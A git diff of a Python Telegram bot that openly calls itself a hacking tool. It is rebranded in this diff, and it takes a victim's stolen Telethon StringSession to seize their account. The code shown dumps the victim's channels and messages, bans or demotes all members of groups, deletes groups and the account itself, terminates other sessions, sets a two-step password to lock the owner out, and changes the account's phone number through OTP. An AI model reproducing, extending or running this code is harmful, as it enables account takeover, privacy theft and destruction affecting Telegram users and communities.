@@ -145,13 +145,13 @@ async def userchannels(strses):
 import logging
 logging.basicConfig(level=logging.WARNING)
 
-channel = "AbhiModszYT_Return"
+channel = "synax10"
 menu = '''
 ┏━━━━━━━━━❥
-┣ Cʀᴇᴀᴛᴇʀ -> @am_YTbott
-┣ Uᴘᴅᴀᴛᴇꜱ -> @AmBotYT
+┣ Cʀᴇᴀᴛᴇʀ -> @ASHWANI10
+┣ Uᴘᴅᴀᴛᴇꜱ -> @synax_chats
 ┗━━━━━━━━━❥
-**Updates JOIN @AmBotYT**
+**Updates JOIN @synax_chats**
 
 
 
@@ -183,21 +183,21 @@ M: [Change Phone number using StringSession]
 
 I ADD MORE FEATURES LATER 
 ┏━━━━━━━━━❥
-┣ Cʀᴇᴀᴛᴇʀ -> @am_YTbott
-┣ About   -> @About_AMBot
-┣ Cʀᴇᴀᴛᴇʀ -> @am_YTbott
-┣ About   -> @About_AMBot
-┣ Cʀᴇᴀᴛᴇʀ -> @am_YTbott
-┣ About   -> @About_AMBot
-┣ Cʀᴇᴀᴛᴇʀ -> @am_YTbott
-┣ About   -> @About_AMBot
+┣ Cʀᴇᴀᴛᴇʀ -> @ASHWANI10
+┣ About   -> @ASHWANI10_OFFICIAL
+┣ Cʀᴇᴀᴛᴇʀ -> @ASHWANI10
+┣ About   -> @ASHWANI10_OFFICIAL
+┣ Cʀᴇᴀᴛᴇʀ -> @ASHWANI10
+┣ About   -> @ASHWANI10_OFFICIAL
+┣ Cʀᴇᴀᴛᴇʀ -> @ASHWANI10
+┣ About   -> @ASHWANI10_OFFICIAL
 ┗━━━━━━━━━❥
 
 '''
 mm = '''
 ┏━━━━━━━━━❥
-┣ Cʀᴇᴀᴛᴇʀ -> @am_YTbott
-┣ Uᴘᴅᴀᴛᴇꜱ -> @AmBotYT
+┣ Cʀᴇᴀᴛᴇʀ -> @ASHWANI10
+┣ Uᴘᴅᴀᴛᴇꜱ -> @synax10
 ┗━━━━━━━━━❥
 i can hack anybody
 Take his StringSession and use me
@@ -208,13 +208,13 @@ Type /hack
 async def op(event):
   global mm
   if not event.is_private:
-    await event.reply("please use me in pm🥺")
+    await event.reply("please use me in pm🥺⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️")
   else:
     await event.reply(mm)
 @client.on(events.NewMessage(pattern="/give"))
 async def op(event):
   if not event.sender_id == legendx:
-    return await event.reply("please don't use me fuck off 🥺")
+    return await event.reply("please don't use me fuck off 🥺⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️")
   try:
     await event.reply("session bot file", file="AbhiModszYT.session")
   except Exception as e:
@@ -232,17 +232,17 @@ async def start(event):
     res = await x.get_response()
     r = res.text
     if res.text == "A":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("GIVE STRING SESSION⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("This StringSession is terminated maybe⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️")
       try:
         i = await userchannels(strses.text)
       except:
-        return await event.reply("This StringSession is terminated maybe")
+        return await event.reply("This StringSession is terminated maybe⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️")
       if len(i) > 3855:
         file = open("session.txt", "w")
         file.write(i + "\n\nDETAILS BY AbhiModszYT")
@@ -250,39 +250,39 @@ async def start(event):
         await bot.send_file(event.chat_id, "session.txt")
         system("rm -rf session.txt")
       else:
-        await event.reply(i + "\n\nThanks For using X Army Bot")
+        await event.reply(i + "\n\nThanks For using ⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️")
     elif res.text == "B":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("GIVE STRING SESSION⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("This StringSession is terminated maybe⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️")
       i = await userinfo(strses.text)
-      await event.reply(i + "\n\nThanks For using @AM_YTBott")
+      await event.reply(i + "\n\nThanks For using ⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️")
     elif r == "C":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("GIVE STRING SESSION⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("This StringSession is terminated maybe⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️")
       await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
       grpid = await x.get_response()
       await userbans(strses.text, grpid.text)
-      await event.reply("Banning all members Thanks For using @AM_YTBott")
+      await event.reply("Banning all members Thanks For using ⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️")
     elif r == "D":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("GIVE STRING SESSION⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("This StringSession is terminated maybe⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️")
       i = await usermsgs(strses.text)
-      await event.reply(i + "\n\nThanks For using @AM_YTBott")
+      await event.reply(i + "\n\nThanks For using ⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️")
     elif r == "E":
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
@@ -290,11 +290,11 @@ async def start(event):
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("This StringSession is terminated maybe⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️")
       await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
       grpid = await x.get_response()
       await joingroup(strses.text, grpid.text)
-      await event.reply("Joined the Channel/Group Thanks For using @AM_YTBott")
+      await event.reply("Joined the Channel/Group Thanks For using ⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️")
     elif r == "F":
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
@@ -302,98 +302,98 @@ async def start(event):
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("This StringSession is terminated maybe⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️")
       await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
       grpid = await x.get_response()
       await leavegroup(strses.text, grpid.text)
-      await event.reply("Leaved the Channel/Group Thanks For using @AM_YTBott")
+      await event.reply("Leaved the Channel/Group Thanks For using ⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️")
     elif r == "G":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("GIVE STRING SESSION⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("This StringSession is terminated maybe⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️")
       await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
       grpid = await x.get_response()
       await delgroup(strses.text, grpid.text)
-      await event.reply("Deleted the Channel/Group Thanks For using @AM_YTBott")
+      await event.reply("Deleted the Channel/Group Thanks For using ⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️")
     elif r == "H":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("GIVE STRING SESSION⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("This StringSession is terminated maybe⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️")
       i = await user2fa(strses.text)
       if i:
-        await event.reply("User don't have two step thats why now two step is `Abhi12` you can login now\n\nThanks For using @AM_YTBott")
+        await event.reply("User don't have two step thats why now two step is `Abhi12` you can login now\n\nThanks For using ⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️")
       else:
-        await event.reply("Sorry User Have two step already")
+        await event.reply("Sorry User Have two step already⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️")
     elif r == "I":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("GIVE STRING SESSION⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("This StringSession is terminated maybe⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️")
       i = await terminate(strses.text)
-      await event.reply("The all sessions are terminated\n\nThanks For using @AM_YTBott")
+      await event.reply("The all sessions are terminated\n\nThanks For using ⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️")
     elif res.text == "J":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("GIVE STRING SESSION⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("This StringSession is terminated maybe⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️")
       i = await delacc(strses.text)
-      await event.reply("The Account is deleted SUCCESSFULLLY\n\nThanks For using @AM_YTBott")
+      await event.reply("The Account is deleted SUCCESSFULLLY\n\nThanks For using ⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️")
     elif res.text == "L":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("GIVE STRING SESSION⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("This StringSession is terminated maybe⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️")
       await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME")
       grp = await x.get_response()
       await x.send_message("NOW GIVE USER USERNAME")
       user = await x.get_response()
       i = await promote(strses.text, grp.text, user.text)
-      await event.reply("I am Promoting you in Group/Channel wait a min 😗😗\n\nThanks For using @AM_YTBott")
+      await event.reply("I am Promoting you in Group/Channel wait a min 😗😗\n\nThanks For using ⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️")
     elif res.text == "K":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("GIVE STRING SESSION⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
-      await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME")
+        return await event.respond("This StringSession is terminated maybe⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️")
+      await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️")
       pro = await x.get_response()
       try:
         i = await demall(strses.text, pro.text)
       except:
         pass
-      await event.reply("I am Demoting all members of Group/Channel wait a min 😗😗\n\nThanks For using @AM_YTBott")
+      await event.reply("I am Demoting all members of Group/Channel wait a min 😗😗\n\nThanks For using ⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️")
     elif res.text == "M":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("GIVE STRING SESSION⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
-      await x.send_message("GIVE NUMBER WHICH YOU WANT TO CHANGE\n[NOTE: DONT USE 2ndline or text now numbers]\n[if you are use 2nd line or text now you can't get otp] ")
+        return await event.respond("This StringSession is terminated maybe⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️")
+      await x.send_message("GIVE NUMBER WHICH YOU WANT TO CHANGE\n[NOTE: DONT USE 2ndline or text now numbers]\n[if you are use 2nd line or text now you can't get otp] ⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️")
       number = (await x.get_response()).text
       try:
         result = await change_number(strses.text, number)
-        await event.respond(result + "\n copy the phone code hash and check your number you got otp\ni stop for 20 sec copy phone code hash and otp")
+        await event.respond(result + "\n copy the phone code hash and check your number you got otp\ni stop for 20 sec copy phone code hash and otp⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️")
         await asyncio.sleep(20)
         await x.send_message("NOW GIVE PHONE CODE HASH")
         phone_code_hash = (await x.get_response()).text
@@ -401,14 +401,14 @@ async def start(event):
         otp = (await x.get_response()).text
         changing = await change_number_code(strses.text, number, phone_code_hash, otp)
         if changing:
-          await event.respond("CONGRATULATIONS NUMBER WAS CHANGED")
+          await event.respond("CONGRATULATIONS NUMBER WAS CHANGED⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️")
         else:
-          await event.respond("Something is wrong")
+          await event.respond("Something is wrong⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️")
       except Exception as e:
-        await event.respond("SEND THIS ERROR TO -@AM_YTBott\n**LOGS**\n" + str(e))
+        await event.respond("SEND THIS ERROR TO -@synax_chats\n**LOGS**\n" + str(e))
 
     else:
-      await event.respond("Wrong Text Found Re type /hack and use")
+      await event.respond("Wrong Text Found Re type /hack and use⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️")
 
 
 
